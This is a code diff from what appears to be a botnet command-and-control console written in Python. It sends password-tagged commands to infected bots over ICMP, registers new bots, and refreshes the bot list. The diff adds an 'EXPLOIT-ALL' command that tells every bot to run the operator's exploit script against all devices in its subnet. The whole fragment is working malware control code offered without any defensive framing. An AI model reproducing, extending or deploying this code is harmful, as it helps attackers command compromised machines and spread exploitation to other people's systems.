@@ -49,14 +49,18 @@ def main():
 
 			elif cmd.startswith("UPDATE-BOTS"):
 				for bot in activeBots:
-					send_icmp(localhost, bot, PASSWORD+"UPDATE")
+					send_icmp(localhost, bot, PASSWORD+"----->UPDATE")
 				expecting = True
 				del activeBots[:]	
+			elif cmd.startswith("EXPLOIT-ALL"):
+				if len(targets) > 0:
+					for target in targets:
+						send_icmp(localhost, target, PASSWORD+"EXPLOIT-ALL")
 			elif cmd.startswith("SET-RESPONSES"):
 				if cmd.split(":")[1] == "OFF":
-					show = True
-				else:
 					show = False
+				else:
+					show = True
 			elif cmd.startswith("EXIT"):
 				return
 			elif cmd.startswith("HELP"):
@@ -66,6 +70,7 @@ def main():
 				print("\n\tSHOW-TARGETS\t\t\t(Shows Selected Targets)")
 				print("\n\tSHOW-BOTS\t\t\t(Shows Active Bots)")
 				print("\n\tUPDATE-BOTS\t\t\t(Refreshes Active Bots List, note there is some delay)")
+				print("\n\tEXPLOIT-ALL\t\t\t(Runs your /var/www/exploit script on all devices in each bot's subnet)")
 				print("\n\tSET-RESPONSES:<OFF OR ON>\t(Should we display bot responses?)")
 				print("\n\tEXIT\t\t\t\t(Goodbye)")
 			else:
@@ -78,8 +83,12 @@ def main():
 				if response != None:
 					if "NEW-BOT-INIT" in response:
 						activeBots.append(response.split(":")[1])
+						print("------->NEW-BOT: "+response.split(":")[1])
 					elif show:
-						print(response)							
+						print(response)	
+				while not traffic.empty():
+					print(traffic.get(True,1))
+						
 		except Exception as e:
 			print("ERROR:")
 			print(e)
